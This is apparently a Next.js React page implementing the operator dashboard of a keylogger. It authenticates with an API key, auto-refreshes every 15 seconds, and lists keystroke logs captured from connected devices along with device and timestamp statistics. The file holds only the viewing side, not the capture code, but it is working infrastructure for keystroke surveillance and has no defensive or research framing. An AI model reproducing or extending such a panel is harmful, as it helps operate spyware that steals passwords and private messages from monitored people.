"use client";

import { Activity, Clock, Keyboard, Monitor, RefreshCw } from "lucide-react";
import { useCallback, useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import type { LogEntry } from "./columns";
import { columns } from "./columns";
import { DataTable } from "./data-table";

interface Stats {
  totalLogs: number;
  totalDevices: number;
  devices: string[];
  oldestLog: string | null;
  newestLog: string | null;
}

export default function DashboardPage() {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [stats, setStats] = useState<Stats>({
    totalLogs: 0,
    totalDevices: 0,
    devices: [],
    oldestLog: null,
    newestLog: null,
  });
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [apiKey, setApiKey] = useState<string>("");
  const [apiKeySet, setApiKeySet] = useState(false);

  // Load API key from localStorage on mount
  useEffect(() => {
    const stored = localStorage.getItem("apiKey");
    if (stored) {
      setApiKey(stored);
      setApiKeySet(true);
    }
  }, []);

  const fetchData = useCallback(async () => {
    if (!apiKey) return;

    setLoading(true);
    setError(null);

    try {
      const [logsRes, statsRes] = await Promise.all([
        fetch("/api/logs?limit=500", {
          headers: { "x-api-key": apiKey },
        }),
        fetch("/api/stats", {
          headers: { "x-api-key": apiKey },
        }),
      ]);

      if (logsRes.status === 401 || statsRes.status === 401) {
        setError("Invalid API key. Please check and try again.");
        setLoading(false);
        return;
      }

      if (!logsRes.ok || !statsRes.ok) {
        setError("Failed to fetch data from the server.");
        setLoading(false);
        return;
      }

      const logsData = await logsRes.json();
      const statsData = await statsRes.json();

      setLogs(logsData.logs ?? []);
      setStats(
        statsData.stats ?? {
          totalLogs: 0,
          totalDevices: 0,
          devices: [],
          oldestLog: null,
          newestLog: null,
        },
      );
    } catch (err) {
      console.error("Failed to fetch dashboard data:", err);
      setError("Network error. Could not reach the server.");
    } finally {
      setLoading(false);
    }
  }, [apiKey]);

  // Fetch data when API key is available
  useEffect(() => {
    if (apiKeySet && apiKey) {
      fetchData();
    }
  }, [apiKeySet, apiKey, fetchData]);

  // Auto-refresh every 15 seconds
  useEffect(() => {
    if (!apiKeySet || !apiKey) return;

    const interval = setInterval(fetchData, 15000);
    return () => clearInterval(interval);
  }, [apiKeySet, apiKey, fetchData]);

  // API key input screen
  if (!apiKeySet) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background">
        <div className="mx-auto w-full max-w-md rounded-xl border bg-card p-8 shadow-sm">
          <div className="mb-6 flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
              <Keyboard className="h-5 w-5 text-primary" />
            </div>
            <div>
              <h1 className="font-bold text-foreground text-lg">
                Keylogger Dashboard
              </h1>
              <p className="text-muted-foreground text-xs">
                Enter your API key to access the dashboard.
              </p>
            </div>
          </div>
          <form
            onSubmit={e => {
              e.preventDefault();
              if (apiKey.trim()) {
                localStorage.setItem("apiKey", apiKey.trim());
                setApiKeySet(true);
              }
            }}
            className="space-y-4"
          >
            <div>
              <label
                htmlFor="api-key"
                className="mb-1.5 block font-medium text-foreground text-sm"
              >
                API Key
              </label>
              <input
                id="api-key"
                type="password"
                value={apiKey}
                onChange={e => setApiKey(e.target.value)}
                placeholder="Enter your API key..."
                className="h-9 w-full rounded-lg border border-input bg-transparent px-3 text-sm outline-none transition-colors placeholder:text-muted-foreground focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50"
              />
            </div>
            <Button type="submit" className="w-full">
              Access Dashboard
            </Button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8">
        {/* Header */}
        <div className="mb-8 flex items-center justify-between">
          <div>
            <h1 className="font-bold text-3xl text-foreground tracking-tight">
              Keylogger Dashboard
            </h1>
            <p className="mt-1 text-muted-foreground text-sm">
              Monitor and view captured keystrokes from connected devices.
            </p>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              onClick={fetchData}
              disabled={loading}
            >
              <RefreshCw
                className={`mr-2 h-4 w-4 ${loading ? "animate-spin" : ""}`}
              />
              Refresh
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => {
                localStorage.removeItem("apiKey");
                setApiKey("");
                setApiKeySet(false);
                setLogs([]);
                setStats({
                  totalLogs: 0,
                  totalDevices: 0,
                  devices: [],
                  oldestLog: null,
                  newestLog: null,
                });
              }}
            >
              Logout
            </Button>
          </div>
        </div>

        {/* Error */}
        {error && (
          <div className="mb-6 rounded-lg border border-destructive/30 bg-destructive/5 p-4 text-destructive text-sm">
            {error}
          </div>
        )}

        {/* Stats Cards */}
        <div className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Keyboard className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Total Logs
                </p>
                <p className="font-bold text-2xl text-foreground">
                  {stats.totalLogs.toLocaleString()}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Monitor className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Active Devices
                </p>
                <p className="font-bold text-2xl text-foreground">
                  {stats.totalDevices}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Clock className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Latest Log
                </p>
                <p className="font-semibold text-foreground text-sm">
                  {stats.newestLog
                    ? new Intl.DateTimeFormat("en-US", {
                        month: "short",
                        day: "2-digit",
                        hour: "2-digit",
                        minute: "2-digit",
                        hour12: true,
                      }).format(new Date(stats.newestLog))
                    : "No logs yet"}
                </p>
              </div>
            </div>
          </div>

          <div className="rounded-lg border bg-card p-4 shadow-sm">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10">
                <Activity className="h-5 w-5 text-primary" />
              </div>
              <div>
                <p className="font-medium text-muted-foreground text-sm">
                  Devices
                </p>
                <p className="max-w-40 truncate font-semibold text-foreground text-sm">
                  {stats.devices.length > 0 ? stats.devices.join(", ") : "None"}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Data Table */}
        <div className="rounded-lg border bg-card p-4 shadow-sm">
          <div className="mb-4">
            <h2 className="font-semibold text-foreground text-lg">
              Captured Logs
            </h2>
            <p className="text-muted-foreground text-sm">
              All keystroke logs received from connected devices.
              {!loading && (
                <span className="ml-1 text-muted-foreground/60">
                  Auto-refreshes every 15s.
                </span>
              )}
            </p>
          </div>
          {loading && logs.length === 0 ? (
            <div className="flex h-40 items-center justify-center text-muted-foreground text-sm">
              <RefreshCw className="mr-2 h-4 w-4 animate-spin" />
              Loading logs...
            </div>
          ) : (
            <DataTable columns={columns} data={logs} />
          )}
        </div>
      </div>
    </div>
  );
}
